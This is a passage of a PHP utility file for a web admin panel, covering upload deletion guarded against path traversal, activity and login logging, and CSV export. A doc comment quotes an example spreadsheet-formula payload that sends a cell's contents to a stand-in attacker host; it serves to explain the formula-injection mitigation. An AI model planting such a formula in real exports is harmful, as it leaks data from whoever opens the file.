            if (!in_array(strtolower($child->nodeName), $allowedElements, true)) {
                $node->removeChild($child);
                continue;
            }

            $scrubAttributes($child);
            $scrub($child);
        }
    };

    $scrubAttributes($doc->documentElement);
    $scrub($doc->documentElement);

    $out = $doc->saveXML();
    return $out === false ? null : $out;
}

/** Delete a previously uploaded file, guarding against path traversal. */
function delete_upload(?string $path): bool
{
    if (empty($path)) {
        return false;
    }
    $relative = ltrim($path, '/');
    if (strpos($relative, 'uploads/') !== 0 || strpos($relative, '..') !== false) {
        return false;
    }
    $full = ROOT_PATH . '/' . $relative;
    return is_file($full) && @unlink($full);
}

// ===========================================================================
//  Misc
// ===========================================================================

/** Cryptographically strong random token. */
function random_token(int $bytes = 32): string
{
    return bin2hex(random_bytes($bytes));
}

/** Build breadcrumb markup from [['label'=>..,'url'=>..], ...]. */
function breadcrumbs(array $items): string
{
    if ($items === []) {
        return '';
    }
    $html = '<nav class="sik-breadcrumb" aria-label="Breadcrumb"><ol>';
    $last = count($items) - 1;
    foreach ($items as $i => $item) {
        $label = e($item['label'] ?? '');
        if ($i === $last || empty($item['url'])) {
            $html .= '<li aria-current="page"><span>' . $label . '</span></li>';
        } else {
            $html .= '<li><a href="' . e($item['url']) . '">' . $label . '</a>'
                // w-3 (12px) sat below the scale; --icon-xs is the smallest
                // glyph the design system defines.
                . '<span class="sik-breadcrumb-sep" aria-hidden="true">' . icon('chevron-right', 'w-3.5 h-3.5') . '</span></li>';
        }
    }
    return $html . '</ol></nav>';
}

/** True when the given route key matches the current script. */
function is_current_page(string $needle): bool
{
    $script = basename($_SERVER['SCRIPT_NAME'] ?? '');
    return $script === $needle || $script === $needle . '.php';
}

/** Human-readable file size. */
function format_bytes(int $bytes, int $precision = 1): string
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $power = $bytes > 0 ? (int) floor(log($bytes, 1024)) : 0;
    $power = min($power, count($units) - 1);
    return round($bytes / (1024 ** $power), $precision) . ' ' . $units[$power];
}

/**
 * Record an admin action in the audit trail.
 * Silently ignored when no admin is signed in.
 */
function log_activity(string $action, ?string $entity = null, ?int $entityId = null, ?string $description = null): void
{
    try {
        $admin = admin_user();
        Database::insert('activity_logs', [
            'admin_id'    => $admin['id'] ?? null,
            'admin_name'  => $admin['name'] ?? null,
            'action'      => mb_substr($action, 0, 100),
            'entity'      => $entity ? mb_substr($entity, 0, 60) : null,
            'entity_id'   => $entityId,
            'description' => $description ? mb_substr($description, 0, 500) : null,
            'ip_address'  => client_ip(),
            'user_agent'  => user_agent(),
        ]);
    } catch (Throwable $e) {
        ErrorHandler::log('warning', 'Activity log failed: ' . $e->getMessage());
    }
}

/** Record a login attempt, successful or not. */
function log_login(string $userType, ?int $userId, string $identifier, bool $success, ?string $reason = null): void
{
    try {
        Database::insert('login_history', [
            'user_type'  => $userType,
            'user_id'    => $userId,
            'identifier' => mb_substr($identifier, 0, 190),
            'status'     => $success ? 'success' : 'failed',
            'reason'     => $reason ? mb_substr($reason, 0, 150) : null,
            'ip_address' => client_ip(),
            'user_agent' => user_agent(),
        ]);
    } catch (Throwable $e) {
        ErrorHandler::log('warning', 'Login history write failed: ' . $e->getMessage());
    }
}

/**
 * Neutralise a CSV cell that a spreadsheet would treat as a formula.
 *
 * Every admin export runs through here. Order notes, customer names and
 * newsletter signups are attacker-supplied free text, and Excel, LibreOffice
 * and Google Sheets all execute a cell that opens with = + - @ (or a leading
 * tab / carriage return). A subscriber called
 *     =HYPERLINK("https://evil.example/?d="&A1,"Invoice")
 * turns the staff member who opens the export into the exfiltration channel.
 *
 * Prefixing with an apostrophe is the OWASP mitigation: the spreadsheet reads
 * the rest as literal text. Genuine numbers are left alone so that a negative
 * amount stays a number instead of becoming text.
 */
function csv_cell($value): string
{
    if ($value === null) {
        return '';
    }
    $value = (string) $value;

    if ($value === '' || is_numeric($value)) {
        return $value;
    }

    return strpbrk(substr($value, 0, 1), "=+-@\t\r") !== false ? "'" . $value : $value;
}

/** Send a CSV download built from rows, using only native PHP. */
function stream_csv(string $filename, array $headers, iterable $rows): void
{
    while (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . preg_replace('/[^A-Za-z0-9._-]/', '', $filename) . '"');
    header('X-Content-Type-Options: nosniff');
    header('Pragma: no-cache');
    header('Expires: 0');

    $out = fopen('php://output', 'w');
    // BOM so Excel opens UTF-8 correctly.
    fwrite($out, "\xEF\xBB\xBF");
    if ($headers !== []) {
        fputcsv($out, array_map('csv_cell', $headers));
    }
    foreach ($rows as $row) {
        fputcsv($out, array_map('csv_cell', (array) $row));
    }
    fclose($out);
    exit;
}
